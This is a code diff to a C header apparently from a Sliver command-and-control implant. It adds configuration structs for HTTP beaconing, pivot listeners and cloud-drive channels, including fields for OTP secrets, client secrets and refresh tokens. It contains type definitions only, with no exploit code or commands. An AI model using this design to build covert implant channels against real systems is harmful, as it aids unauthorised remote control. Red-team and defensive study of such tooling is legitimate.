@@ -10,6 +10,9 @@ typedef struct _SLIVER_HTTP_CLIENT SLIVER_HTTP_CLIENT, * PSLIVER_HTTP_CLIENT;
 typedef struct _SLIVER_BEACON_CLIENT SLIVER_BEACON_CLIENT, * PSLIVER_BEACON_CLIENT;
 typedef struct _SLIVER_SESSION_CLIENT SLIVER_SESSION_CLIENT, * PSLIVER_SESSION_CLIENT;
 typedef struct _GLOBAL_CONFIG GLOBAL_CONFIG, * PGLOBAL_CONFIG;
+typedef struct _HTTP_PROFILE HTTP_PROFILE, * PHTTP_PROFILE;
+typedef struct _PIVOT_PROFILE PIVOT_PROFILE, * PPIVOT_PROFILE;
+typedef struct _DRIVE_PROFILE DRIVE_PROFILE, * PDRIVE_PROFILE;
 
 typedef LPVOID(WINAPI* CLIENT_INIT)();
 typedef BOOL(WINAPI* CLIENT_START)(PGLOBAL_CONFIG, LPVOID);
@@ -52,6 +55,15 @@ struct _GLOBAL_CONFIG {
 	DWORD dwNumberOfListeners;
 	SRWLOCK RWLock;
 	LPWSTR lpScriptPath;
+	UINT64 uProtocol;
+	UINT64 uImplantType;
+
+	PHTTP_PROFILE* HttpProfiles;
+	DWORD cHttpProfiles;
+	PDRIVE_PROFILE* DriveProfiles;
+	DWORD cDriveProfiles;
+	PPIVOT_PROFILE* PivotProfiles;
+	DWORD cPivotProfiles;
 };
 
 typedef struct _SLIVER_RESP {
@@ -74,6 +86,47 @@ typedef struct _SIGNATURE {
 	LPSTR lpTrustedComment;
 	BYTE GlobalSignature[64];
 } SIGNATURE, *PSIGNATURE;
+
+struct _HTTP_PROFILE {
+	LPSTR lpUrl;
+	LPSTR PollPaths;
+	DWORD cPollPaths;
+	LPSTR PollFiles;
+	DWORD cPollFiles;
+	LPSTR SessionPaths;
+	DWORD cSessionPaths;
+	LPSTR SessionFiles;
+	DWORD cSessionFiles;
+	LPSTR ClosePaths;
+	DWORD cClosePaths;
+	LPSTR CloseFiles;
+	DWORD cCloseFiles;
+	LPSTR lpUserAgent;
+	LPSTR lpOtpSecret;
+	DWORD dwOtpInterval;
+	DWORD dwMinNumberOfSegments;
+	DWORD dwMaxNumberOfSegments;
+	DWORD dwPollInterval;
+	BOOL UseStandardPort;
+};
+
+struct _PIVOT_PROFILE {
+	LPSTR lpBindAddress;
+	DWORD dwReadDeadline;
+	DWORD dwWriteDeadline;
+};
+
+struct _DRIVE_PROFILE {
+	LPSTR lpClientID;
+	LPSTR lpClientSecret;
+	LPSTR lpRefreshToken;
+	LPSTR lpUserAgent;
+	LPSTR lpStartExtension;
+	LPSTR lpSendExtension;
+	LPSTR lpRecvExtension;
+	LPSTR lpRegisterExtension;
+	DWORD dwPollInterval;
+};
 
 PBUFFER RegisterSliver
 (
